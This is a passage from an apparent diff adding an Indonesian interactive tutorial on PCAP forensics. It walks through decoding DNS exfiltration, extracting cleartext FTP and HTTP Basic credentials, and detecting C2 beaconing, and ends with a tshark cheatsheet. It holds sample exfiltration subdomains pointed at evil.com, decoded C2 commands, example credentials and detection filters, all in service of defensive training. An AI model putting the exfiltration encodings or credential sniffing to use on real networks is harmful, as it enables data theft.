+  -e dns.qry.name | awk '{print int($1/60)}' | sort | uniq -c
+    </div>
+    <div class="note" style="margin-top:.5rem">Tools khusus DNS forensic: <strong>DNScat2</strong> (C2 over DNS), <strong>iodine</strong> (TCP tunneling over DNS). Keduanya menggunakan pola yang sama: encode data di subdomain.</div>
+  </div>
+</div>
+
+<!-- D1 STEP 4 -->
+<div class="step-panel" id="d1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Jenis DNS exfil lainnya</div>
+    <h3>Base64 hanya satu cara — ada banyak variasi</h3>
+    <table class="tbl">
+      <tr><th>Metode encoding</th><th>Contoh subdomain</th><th>Cara decode</th></tr>
+      <tr class="purple-row"><td>Base64</td><td>aGVsbG8=.evil.com</td><td>base64 -d</td></tr>
+      <tr class="purple-row"><td>Hex encoding</td><td>68656c6c6f.evil.com</td><td>xxd -r -p / bytes.fromhex()</td></tr>
+      <tr class="purple-row"><td>Decimal encoding</td><td>104.101.108.evil.com</td><td>chr() per segment</td></tr>
+      <tr class="purple-row"><td>Custom alphabet</td><td>XKJLmop.evil.com</td><td>Perlu cari pola/kunci</td></tr>
+      <tr class="warn-row"><td>DNS TXT record</td><td>Query TXT evil.com → data di response</td><td>Lihat TXT record value</td></tr>
+    </table>
+    <div class="code-block">
+<span class="cm">## Decode hex subdomain:</span>
+subdomain_hex = <span class="cs">"68656c6c6f"</span>
+decoded = bytes.fromhex(subdomain_hex).decode()
+print(decoded)  <span class="cm"># → "hello"</span>
+
+<span class="cm">## Extract DNS TXT record exfil:</span>
+tshark -r capture.pcap \
+  -Y "dns.resp.type == 16" \  <span class="cm"># type 16 = TXT</span>
+  -T fields -e dns.txt
+    </div>
+  </div>
+</div>
+
+<!-- D1 STEP 5 -->
+<div class="step-panel" id="d1-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Jawaban dan ringkasan</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Jawaban soal</div>
+      <div class="big-ans">"hello world this isa secret message"</div>
+      <div class="big-ans" style="margin-top:4px">Filter: dns.qry.name contains "evil-c2.com"</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan DNS Exfiltration Forensic</p>
+      <p style="font-size:12px">1. Cari volume DNS tinggi ke domain tidak dikenal</p>
+      <p style="font-size:12px">2. Identifikasi subdomain panjang / random / base64 pattern</p>
+      <p style="font-size:12px">3. Extract semua subdomain dari query → sort by timestamp</p>
+      <p style="font-size:12px">4. Decode encoding (base64, hex, dll) → rekonstruksi pesan</p>
+      <p style="font-size:12px">5. Identifikasi arah exfil: internal IP → external DNS server</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end dns -->
+
+<!-- ============================================================ -->
+<!-- SOAL 3: CREDENTIALS -->
+<!-- ============================================================ -->
+<div id="sec-creds" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 3 — Credential Extraction dari Cleartext Protocol</div>
+  <h2 style="color:#26215C">Temukan credentials dari FTP dan HTTP Basic Auth!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">Beberapa protokol lama mengirim credentials dalam cleartext. Analisis PCAP untuk extract username/password dari FTP session dan HTTP Basic Authentication!</p>
+  <div style="background:#fff;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:11px;border:0.5px solid #AFA9EC;margin-bottom:.75rem;line-height:1.9">
+    <div style="color:#888;margin-bottom:4px">Packets relevan:</div>
+    <div class="pkt pkt-ok"><span>FTP: 220 Welcome to FTP Server</span></div>
+    <div class="pkt pkt-warn"><span>FTP: USER administrator</span></div>
+    <div class="pkt pkt-sus"><span>FTP: PASS s3cr3tP@ssw0rd</span></div>
+    <div class="pkt pkt-ok"><span>FTP: 230 Login successful</span></div>
+    <div class="pkt pkt-sus"><span>FTP: RETR /confidential/budget_2024.xlsx</span></div>
+    <div style="margin-top:6px;color:#888">HTTP packets:</div>
+    <div class="pkt pkt-sus"><span>GET /admin HTTP/1.1 | Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=</span></div>
+    <div class="pkt pkt-ok"><span>HTTP/1.1 200 OK (admin panel)</span></div>
+  </div>
+  <p style="color:#3C3489;font-size:12px">Pertanyaan: (1) Extract FTP credentials, (2) Decode HTTP Basic Auth, (3) File apa yang didownload?</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="c1-prev" onclick="prevStep('c1')" disabled>Prev</button>
+  <div class="step-dots" id="c1-dots"></div>
+  <span class="step-label" id="c1-counter">1 / 5</span>
+  <button class="btn-nav btn-next" id="c1-next" onclick="nextStep('c1')">Next</button>
+</div>
+
+<!-- C1 STEP 0 -->
+<div class="step-panel active" id="c1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Extract FTP credentials</div>
+    <h3>FTP mengirim USER dan PASS dalam plaintext</h3>
+    <p style="margin-bottom:.75rem">FTP adalah protokol lama yang tidak ada enkripsi. Semua data termasuk password terlihat jelas di PCAP!</p>
+    <span class="eq-hi">Dari FTP stream:
+USER administrator  ← username
+PASS s3cr3tP@ssw0rd ← password dalam cleartext!</span>
+    <div class="code-block">
+<span class="cm">## Wireshark filter untuk FTP:</span>
+ftp
+ftp.request.command == "USER"
+ftp.request.command == "PASS"
+ftp.request.command == "RETR"  <span class="cm">← file yang didownload</span>
+ftp.request.command == "STOR"  <span class="cm">← file yang diupload</span>
+
+<span class="cm">## tshark untuk extract credentials:</span>
+tshark -r capture.pcap -Y ftp \
+  -T fields -e ftp.request.command \
+  -e ftp.request.arg
+
+<span class="cm">## Output:</span>
+<span class="cm"># USER    administrator</span>
+<span class="cm"># PASS    s3cr3tP@ssw0rd  ← credential!</span>
+<span class="cm"># RETR    /confidential/budget_2024.xlsx</span>
+
+<span class="cm">## Untuk extract file yang di-transfer (FTP data stream):</span>
+<span class="cm"># Wireshark → Follow TCP Stream (port 20 atau passive port)</span>
+<span class="cm"># Atau: File → Export Objects → FTP-DATA</span>
+    </div>
+    <div class="danger">Credentials: administrator / s3cr3tP@ssw0rd. File yang dicuri: budget_2024.xlsx!</div>
+  </div>
+</div>
+
+<!-- C1 STEP 1 -->
+<div class="step-panel" id="c1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Decode HTTP Basic Authentication</div>
+    <h3>Basic Auth = Base64(username:password) — sangat mudah didecode!</h3>
+    <p style="margin-bottom:.75rem">HTTP Basic Auth mengirim credentials dalam header Authorization sebagai Base64. Bukan enkripsi — hanya encoding!</p>
+    <span class="eq">Header: Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
+
+Decode Base64:
+YWRtaW46cGFzc3dvcmQxMjM= → "admin:password123"
+
+Format: username:password dipisah titik dua (:)</span>
+    <div class="code-block">
+<span class="cm">## Python decode:</span>
+<span class="ck">import</span> base64
+encoded = <span class="cs">"YWRtaW46cGFzc3dvcmQxMjM="</span>
+decoded = base64.b64decode(encoded).decode()
+print(decoded)  <span class="cm"># → "admin:password123"</span>
+
+username, password = decoded.split(<span class="cs">':'</span>, <span class="cn">1</span>)
+print(<span class="cs">f"User: {username}, Pass: {password}"</span>)
+<span class="cm"># → User: admin, Pass: password123</span>
+
+<span class="cm">## Wireshark filter untuk HTTP Basic Auth:</span>
+http.authorization contains "Basic"
+
+<span class="cm">## tshark extract:</span>
+tshark -r capture.pcap \
+  -Y "http.authorization" \
+  -T fields -e http.authorization
+<span class="cm"># → Basic YWRtaW46cGFzc3dvcmQxMjM=</span>
+    </div>
+    <span class="eq-hi">HTTP Basic Auth credentials: admin / password123</span>
+  </div>
+</div>
+
+<!-- C1 STEP 2 -->
+<div class="step-panel" id="c1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Protokol cleartext lainnya</div>
+    <h3>Daftar protokol yang credentials-nya bisa diextract dari PCAP</h3>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Protokol</th><th>Port</th><th>Cara extract</th><th>Filter Wireshark</th></tr>
+      <tr class="hi-row"><td>FTP</td><td>21</td><td>USER/PASS command</td><td>ftp.request.command=="PASS"</td></tr>
+      <tr class="hi-row"><td>HTTP Basic</td><td>80</td><td>Decode Base64 dari Authorization header</td><td>http.authorization</td></tr>
+      <tr class="hi-row"><td>Telnet</td><td>23</td><td>Follow TCP stream — semuanya plaintext</td><td>telnet / tcp.port==23</td></tr>
+      <tr class="hi-row"><td>SMTP</td><td>25</td><td>AUTH LOGIN: base64 user lalu pass</td><td>smtp.auth.username</td></tr>
+      <tr class="hi-row"><td>POP3</td><td>110</td><td>USER/PASS command</td><td>pop.request.command=="PASS"</td></tr>
+      <tr class="hi-row"><td>IMAP</td><td>143</td><td>LOGIN command</td><td>imap contains "LOGIN"</td></tr>
+      <tr class="ok-row"><td>HTTPS/FTPS/SSH</td><td>443/990/22</td><td>Dienkripsi — tidak bisa extract</td><td>—</td></tr>
+    </table>
+    <div class="code-block">
+<span class="cm">## Bulk credential extraction dengan NetworkMiner atau:</span>
+tshark -r capture.pcap -q -z credentials
+<span class="cm"># Output semua credentials yang ditemukan otomatis!</span>
+    </div>
+  </div>
+</div>
+
+<!-- C1 STEP 3 -->
+<div class="step-panel" id="c1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Rekonstruksi file yang ditransfer</div>
+    <h3>Export budget_2024.xlsx dari FTP data stream</h3>
+    <div class="code-block">
+<span class="cm">## Wireshark GUI:</span>
+<span class="cm"># File → Export Objects → FTP-DATA</span>
+<span class="cm"># Pilih "budget_2024.xlsx" → Save</span>
+
+<span class="cm">## tshark command line:</span>
+tshark -r capture.pcap \
+  --export-objects ftp-data,./extracted/
+
+<span class="cm">## Atau dengan tcpflow:</span>
+tcpflow -r capture.pcap -g -e ftp
+
+<span class="cm">## Verifikasi file yang diextract:</span>
+file budget_2024.xlsx
+<span class="cm"># → Microsoft Excel 2007+</span>
+
+md5sum budget_2024.xlsx
+<span class="cm"># → d41d8cd98f00b204e9800998ecf8427e</span>
+<span class="cm"># Hash ini bisa dijadikan IoC (Indicator of Compromise)</span>
+
+<span class="cm">## Untuk SMTP attachment:</span>
+tshark -r capture.pcap \
+  --export-objects smb,./extracted/   <span class="cm"># atau imf untuk email</span>
+    </div>
+    <div class="ok">File budget_2024.xlsx berhasil direkonstruksi dari FTP data stream. File ini bisa dianalisis lebih lanjut atau di-hash untuk dijadikan IoC.</div>
+  </div>
+</div>
+
+<!-- C1 STEP 4 -->
+<div class="step-panel" id="c1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Jawaban dan ringkasan</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Jawaban soal</div>
+      <div class="big-ans">(1) FTP: administrator / s3cr3tP@ssw0rd</div>
+      <div class="big-ans" style="margin-top:4px">(2) HTTP: admin / password123</div>
+      <div class="big-ans" style="margin-top:4px">(3) budget_2024.xlsx</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan Credential Extraction</p>
+      <p style="font-size:12px">FTP: filter ftp → USER/PASS langsung terlihat di request command</p>
+      <p style="font-size:12px">HTTP Basic: filter http.authorization → decode Base64 → user:pass</p>
+      <p style="font-size:12px">Bulk: tshark -z credentials menampilkan semua sekaligus</p>
+      <p style="font-size:12px">File transfer: Export Objects → pilih protokol (HTTP/FTP/SMB)</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end creds -->
+
+<!-- ============================================================ -->
+<!-- SOAL 4: C2 DETECTION -->
+<!-- ============================================================ -->
+<div id="sec-c2" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 4 — C2 (Command & Control) Traffic Detection</div>
+  <h2 style="color:#26215C">Deteksi beaconing dan komunikasi C2!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">Malware yang sudah menginfeksi host melakukan <strong>beaconing</strong> — koneksi periodik ke C2 server untuk menerima perintah. Analisis PCAP untuk identifikasi pola C2 dan decode perintah yang diterima!</p>
+  <div style="background:#fff;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:11px;border:0.5px solid #AFA9EC;margin-bottom:.75rem;line-height:1.9">
+    <div style="color:#888;margin-bottom:4px">Traffic pattern yang dicurigai (30 menit window):</div>
+    <div class="pkt pkt-sus"><span>t=00:00  192.168.1.100 → 185.220.101.5:8080  POST /update  sz=128B</span></div>
+    <div class="pkt pkt-sus"><span>t=05:00  192.168.1.100 → 185.220.101.5:8080  POST /update  sz=128B</span></div>
+    <div class="pkt pkt-sus"><span>t=10:00  192.168.1.100 → 185.220.101.5:8080  POST /update  sz=128B</span></div>
+    <div class="pkt pkt-sus"><span>t=15:00  192.168.1.100 → 185.220.101.5:8080  POST /update  sz=128B</span></div>
+    <div class="pkt pkt-sus"><span>t=20:00  192.168.1.100 → 185.220.101.5:8080  POST /update  sz=256B</span></div>
+    <div class="pkt pkt-sus"><span>t=20:01  185.220.101.5 → 192.168.1.100  Response: "Y21kOnNsZWVwIDMw"</span></div>
+    <div class="pkt pkt-sus"><span>t=25:00  192.168.1.100 → 185.220.101.5:8080  POST /update  sz=1024B</span></div>
+    <div class="pkt pkt-sus"><span>t=25:01  185.220.101.5 → 192.168.1.100  Response: "Y21kOmV4ZmlsdHJhdGU="</span></div>
+  </div>
+  <p style="color:#3C3489;font-size:12px">Pertanyaan: (1) Identifikasi pola beaconing, (2) Decode perintah C2, (3) Filter untuk detect C2 traffic!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="c2-prev" onclick="prevStep('c2')" disabled>Prev</button>
+  <div class="step-dots" id="c2-dots"></div>
+  <span class="step-label" id="c2-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="c2-next" onclick="nextStep('c2')">Next</button>
+</div>
+
+<!-- C2 STEP 0 -->
+<div class="step-panel active" id="c2-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Identifikasi pola beaconing</div>
+    <h3>Beaconing = koneksi periodik dengan interval konsisten</h3>
+    <p style="margin-bottom:.75rem">Analisis interval dan karakteristik koneksi:</p>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Karakteristik</th><th>Nilai</th><th>Indikasi</th></tr>
+      <tr class="hi-row"><td>Interval</td><td>Persis 5 menit (300 detik)</td><td>Beaconing! Manusia tidak konsisten persis begini</td></tr>
+      <tr class="hi-row"><td>Ukuran POST</td><td>128B konsisten (heartbeat)</td><td>Check-in rutin, belum ada payload</td></tr>
+      <tr class="warn-row"><td>Ukuran t=20:00</td><td>256B (lebih besar)</td><td>Malware kirim data sistem ke C2</td></tr>
+      <tr class="warn-row"><td>Ukuran t=25:00</td><td>1024B (jauh lebih besar)</td><td>Malware exfiltrating data!</td></tr>
+      <tr class="hi-row"><td>Destination</td><td>185.220.101.5:8080</td><td>Port 8080 tidak umum untuk "update" service</td></tr>
+    </table>
+    <div class="danger">Pola beaconing yang sangat reguler (persis 5 menit) adalah signature malware. Human traffic tidak pernah persis konsisten seperti ini — ini pasti automated!</div>
+  </div>
+</div>
+
+<!-- C2 STEP 1 -->
+<div class="step-panel" id="c2-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Decode perintah C2</div>
+    <h3>Response dari C2 di-encode Base64 — decode untuk lihat perintah</h3>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>C2 Response (Base64)</th><th>Decoded</th><th>Artinya</th></tr>
+      <tr class="hi-row"><td>Y21kOnNsZWVwIDMw</td><td>cmd:sleep 30</td><td>Malware diperintah tidur 30 detik</td></tr>
+      <tr class="hi-row"><td>Y21kOmV4ZmlsdHJhdGU=</td><td>cmd:exfiltrate</td><td>Malware diperintah exfiltrate data!</td></tr>
+    </table>
+    <div class="code-block">
+<span class="cm">## Decode C2 commands:</span>
+<span class="ck">import</span> base64
+
+c2_responses = [
+    <span class="cs">"Y21kOnNsZWVwIDMw"</span>,
+    <span class="cs">"Y21kOmV4ZmlsdHJhdGU="</span>
+]
+
+<span class="ck">for</span> resp <span class="ck">in</span> c2_responses:
+    decoded = base64.b64decode(resp).decode()
+    print(<span class="cs">f"{resp} → {decoded}"</span>)
+
+<span class="cm"># Y21kOnNsZWVwIDMw → cmd:sleep 30</span>
+<span class="cm"># Y21kOmV4ZmlsdHJhdGU= → cmd:exfiltrate</span>
+
+<span class="cm">## Extract semua response body dari PCAP:</span>
+tshark -r capture.pcap \
+  -Y "http.response && ip.src==185.220.101.5" \
+  -T fields -e http.file_data | base64 -d
+    </div>
+    <div class="danger">Malware menerima perintah "exfiltrate" — ini berarti data sensitif sedang atau sudah dikirim ke C2! Packet t=25:00 dengan ukuran 1024B adalah exfiltration payload.</div>
+  </div>
+</div>
+
+<!-- C2 STEP 2 -->
+<div class="step-panel" id="c2-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Filter dan analisis C2 traffic</div>
+    <h3>Wireshark filter untuk detect dan isolasi C2</h3>
+    <div class="code-block">
+<span class="cm">## Filter traffic ke C2 server:</span>
+ip.dst == 185.220.101.5
+
+<span class="cm">## Filter POST ke /update (endpoint C2):</span>
+http.request.method == "POST" && http.request.uri == "/update"
+
+<span class="cm">## Lihat seluruh conversation C2:</span>
+ip.addr == 185.220.101.5
+
+<span class="cm">## Hitung interval antar POST untuk konfirmasi beaconing:</span>
+tshark -r capture.pcap \
+  -Y 'http.request.method=="POST" && ip.dst==185.220.101.5' \
+  -T fields -e frame.time_relative
+
+<span class="cm">## Output: 0.0, 300.1, 600.2, 900.3, 1200.1, 1500.4</span>
+<span class="cm">## Interval rata-rata: ~300 detik = 5 menit → confirmed beaconing!</span>
+
+<span class="cm">## Calculate jitter (variasi interval):</span>
+<span class="ck">import</span> numpy <span class="ck">as</span> np
+intervals = [<span class="cn">300.1</span>, <span class="cn">300.1</span>, <span class="cn">300.1</span>, <span class="cn">299.8</span>, <span class="cn">300.3</span>]
+print(<span class="cs">f"Mean: {np.mean(intervals):.1f}s, Jitter: {np.std(intervals):.2f}s"</span>)
+<span class="cm"># Jitter < 1 detik = definitely automated (malware), bukan manusia</span>
+    </div>
+  </div>
+</div>
+
+<!-- C2 STEP 3 -->
+<div class="step-panel" id="c2-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Threat intelligence: check IP/domain</div>
+    <h3>Lookup C2 IP di threat intel database</h3>
+    <div class="code-block">
+<span class="cm">## Check IP di threat intelligence:</span>
+
+<span class="cm"># VirusTotal:</span>
+$ curl "https://www.virustotal.com/api/v3/ip_addresses/185.220.101.5" \
+  -H "x-apikey: YOUR_KEY"
+<span class="cm"># → Malicious: 47/90 vendors flag this IP</span>
+<span class="cm"># → Tags: C2, Cobalt Strike, malware</span>
+
+<span class="cm"># AbuseIPDB:</span>
+$ curl "https://api.abuseipdb.com/api/v2/check?ipAddress=185.220.101.5" \
+  -H "Key: YOUR_KEY"
+<span class="cm"># → abuseConfidenceScore: 100</span>
+<span class="cm"># → Reports: 234 in last 90 days</span>
+
+<span class="cm"># Shodan:</span>
+$ shodan host 185.220.101.5
+<span class="cm"># → Open ports: 80, 443, 8080, 8443, 50050</span>
+<span class="cm"># → Port 50050 = Cobalt Strike Team Server default port!</span>
+
+<span class="cm">## Identify malware family dari C2 pattern:</span>
+<span class="cm"># Endpoint /update, POST, 5-min interval, base64 response</span>
+<span class="cm"># → Pattern matches Cobalt Strike HTTP beacon!</span>
+    </div>
+    <div class="ok">C2 IP 185.220.101.5 dengan port 50050 terbuka dan pattern yang cocok → kemungkinan besar ini adalah Cobalt Strike C2 server!</div>
+  </div>
+</div>
+
+<!-- C2 STEP 4 -->
+<div class="step-panel" id="c2-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Beaconing jitter analysis</div>
+    <h3>Cara membedakan beaconing malware vs traffic normal</h3>
+    <div class="code-block">
+<span class="cm">## Script Python untuk detect beaconing otomatis:</span>
+<span class="ck">import</span> pyshark, numpy <span class="ck">as</span> np
+<span class="ck">from</span> collections <span class="ck">import</span> defaultdict
+
+cap = pyshark.FileCapture(<span class="cs">'capture.pcap'</span>,
+      display_filter=<span class="cs">'tcp'</span>)
+
+<span class="cm"># Kumpulkan timestamp per destination IP</span>
+connections = defaultdict(list)
+<span class="ck">for</span> pkt <span class="ck">in</span> cap:
+    <span class="ck">try</span>:
+        dst = pkt.ip.dst
+        ts  = float(pkt.sniff_timestamp)
+        connections[dst].append(ts)
+    <span class="ck">except</span>: <span class="ck">pass</span>
+
+<span class="cm"># Hitung interval dan jitter untuk setiap destination</span>
+<span class="ck">for</span> ip, timestamps <span class="ck">in</span> connections.items():
+    <span class="ck">if</span> len(timestamps) < <span class="cn">5</span>: <span class="ck">continue</span>
+    timestamps.sort()
+    intervals = np.diff(timestamps)
+    mean_int  = np.mean(intervals)
+    jitter    = np.std(intervals)
+
+    <span class="cm"># Beaconing: interval > 30s, jitter < 5% dari mean</span>
+    <span class="ck">if</span> mean_int > <span class="cn">30</span> <span class="ck">and</span> jitter/mean_int < <span class="cn">0.05</span>:
+        print(<span class="cs">f"[BEACON] {ip}: interval={mean_int:.0f}s jitter={jitter:.2f}s"</span>)
+<span class="cm"># → [BEACON] 185.220.101.5: interval=300s jitter=0.12s</span>
+    </div>
+    <div class="note">Tools dedicated untuk beaconing detection: <strong>RITA</strong> (Real Intelligence Threat Analytics) dan <strong>AC Hunter</strong> — keduanya menganalisis PCAP dan log untuk otomatis detect beaconing.</div>
+  </div>
+</div>
+
+<!-- C2 STEP 5 -->
+<div class="step-panel" id="c2-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Jawaban dan ringkasan</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Jawaban soal</div>
+      <div class="big-ans">(1) Beaconing: interval 5 menit persis, jitter minimal</div>
+      <div class="big-ans" style="margin-top:4px">(2) cmd:sleep 30 | cmd:exfiltrate</div>
+      <div class="big-ans" style="margin-top:4px">(3) ip.dst==185.220.101.5 && http</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan C2 Detection</p>
+      <p style="font-size:12px">1. Cari traffic ke IP eksternal tidak dikenal di port non-standard</p>
+      <p style="font-size:12px">2. Hitung interval antar koneksi → jitter rendah = beaconing</p>
+      <p style="font-size:12px">3. Decode payload (Base64) → lihat perintah C2</p>
+      <p style="font-size:12px">4. Cek C2 IP di VirusTotal / AbuseIPDB / Shodan</p>
+      <p style="font-size:12px">5. Identifikasi malware family dari pattern (endpoint, interval, encoding)</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">Common C2 frameworks: Cobalt Strike, Metasploit Meterpreter, Sliver, Havoc</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end c2 -->
+
+<!-- ============================================================ -->
+<!-- TSHARK CHEATSHEET -->
+<!-- ============================================================ -->
+<div id="sec-tshark" class="sec">
+  <div class="card">
+    <div class="step-title">tshark — command line Wireshark</div>
+    <h3>Perintah tshark yang paling sering dipakai di forensik</h3>
+    <div class="code-block">
+<span class="cm">#### BASIC READING ####</span>
+<span class="cm"># Baca PCAP dan tampilkan summary:</span>
+tshark -r capture.pcap
+
+<span class="cm"># Filter + tampilkan field tertentu:</span>
+tshark -r capture.pcap -Y "http" -T fields \
+  -e frame.number -e ip.src -e ip.dst \
+  -e http.request.method -e http.request.uri
+
+<span class="cm">#### STATISTICS ####</span>
+<span class="cm"># Top talkers (IP conversations):</span>
+tshark -r capture.pcap -q -z conv,ip
+
+<span class="cm"># Protocol hierarchy:</span>
+tshark -r capture.pcap -q -z io,phs
+
+<span class="cm"># DNS query summary:</span>
+tshark -r capture.pcap -q -z dns,tree
+
+<span class="cm"># HTTP request summary:</span>
+tshark -r capture.pcap -q -z http,tree
+
+<span class="cm"># All credentials found:</span>
+tshark -r capture.pcap -q -z credentials
+
+<span class="cm">#### EXTRACTION ####</span>
+<span class="cm"># Export HTTP objects:</span>
+tshark -r capture.pcap --export-objects http,./http_objects/
+
+<span class="cm"># Export FTP data:</span>
+tshark -r capture.pcap --export-objects ftp-data,./ftp_objects/
+
+<span class="cm"># Follow TCP stream dan save:</span>
+tshark -r capture.pcap -z follow,tcp,ascii,0
+
+<span class="cm">#### SEARCH ####</span>
+<span class="cm"># Cari string di seluruh PCAP:</span>
+tshark -r capture.pcap -Y 'frame contains "password"'
+
+<span class="cm"># Cari semua URL yang mengandung "admin":</span>
+tshark -r capture.pcap -Y 'http.request.uri contains "admin"' \
+  -T fields -e http.request.uri
+
+<span class="cm"># Extract semua DNS query:</span>
+tshark -r capture.pcap -Y dns -T fields \
+  -e dns.qry.name | sort | uniq
+
+<span class="cm"># Extract semua IP unik:</span>
+tshark -r capture.pcap -T fields -e ip.src -e ip.dst \
+  | tr '\t' '\n' | sort | uniq
+
+<span class="cm">#### SPECIFIC PROTOCOLS ####</span>
+<span class="cm"># FTP credentials:</span>
+tshark -r capture.pcap -Y ftp -T fields \
+  -e ftp.request.command -e ftp.request.arg | grep -E "USER|PASS"
+
+<span class="cm"># HTTP Basic Auth:</span>
+tshark -r capture.pcap -Y "http.authorization" \
+  -T fields -e http.authorization
+
+<span class="cm"># ICMP (ping-based C2 detection):</span>
+tshark -r capture.pcap -Y icmp -T fields \
+  -e ip.src -e ip.dst -e icmp.type -e data.data
+
+<span class="cm">#### ADVANCED ####</span>
+<span class="cm"># Deteksi beaconing (hitung interval):</span>
+tshark -r capture.pcap -Y "ip.dst==185.220.101.5" \
+  -T fields -e frame.time_epoch \
+  | awk 'NR>1{print $1-prev}{prev=$1}'
+
+<span class="cm"># Convert PCAP to JSON for further processing:</span>
+tshark -r capture.pcap -T json > packets.json
+
+<span class="cm"># Capture live traffic:</span>
+tshark -i eth0 -w output.pcap
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Ringkasan — Checklist soal PCAP forensic</div>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Jenis Soal</th><th>Langkah Pertama</th><th>Filter Utama</th></tr>
+      <tr class="purple-row"><td>HTTP Attack</td><td>Lihat semua HTTP request</td><td>http.request + contains "cmd"</td></tr>
+      <tr class="purple-row"><td>DNS Exfil</td><td>Hitung volume DNS per domain</td><td>dns.qry.name matches "[A-Za-z0-9+/=]{20,}"</td></tr>
+      <tr class="purple-row"><td>Credentials</td><td>tshark -z credentials</td><td>ftp / http.authorization</td></tr>
+      <tr class="purple-row"><td>C2 Detection</td><td>Hitung interval koneksi ke IP eksternal</td><td>ip.dst == [C2 IP]</td></tr>
+      <tr class="purple-row"><td>File Recovery</td><td>Export Objects sesuai protokol</td><td>--export-objects http/ftp/smb</td></tr>
+      <tr class="purple-row"><td>Recon Scan</td><td>Cari SYN ke banyak port</td><td>tcp.flags.syn==1 && tcp.flags.ack==0</td></tr>
+    </table>
+    <div class="note">Urutan analisis yang selalu work: (1) Statistics → Protocol Hierarchy, (2) Statistics → Conversations untuk top talkers, (3) Follow stream pada koneksi mencurigakan, (4) Export objects, (5) tshark untuk batch processing.</div>
+  </div>
+</div>
+
+<script>
+const state={
+  h1:{cur:0,total:6},
+  d1:{cur:0,total:6},
+  c1:{cur:0,total:5},
+  c2:{cur:0,total:6}
+};
+function renderDots(id){
+  const s=state[id];
+  const d=document.getElementById(id+'-dots');
+  d.innerHTML='';
+  for(let i=0;i<s.total;i++){
+    const b=document.createElement('button');
+    b.className='dot';
+    b.style.cssText=i<s.cur?'background:#AFA9EC':i===s.cur?'background:#534AB7;width:24px;border-radius:5px':'background:#ccc';
+    b.onclick=(()=>{const j=i;return()=>goStep(id,j)})();
+    d.appendChild(b);
+  }
+}
+function goStep(id,n){
+  const s=state[id];
+  document.getElementById(id+'-step-'+s.cur).classList.remove('active');
+  s.cur=n;
+  document.getElementById(id+'-step-'+n).classList.add('active');
+  document.getElementById(id+'-counter').textContent=(n+1)+' / '+s.total;
+  document.getElementById(id+'-prev').disabled=n===0;
+  document.getElementById(id+'-next').disabled=n===s.total-1;
+  renderDots(id);
+}
+function nextStep(id){const s=state[id];if(s.cur<s.total-1)goStep(id,s.cur+1);}
+function prevStep(id){const s=state[id];if(s.cur>0)goStep(id,s.cur-1);}
+function showSec(name){
+  document.querySelectorAll('.sec').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('sec-'+name).classList.add('active');
+  event.target.classList.add('active');
+}
+renderDots('h1');renderDots('d1');renderDots('c1');renderDots('c2');
+</script>
+</body>
+</html>
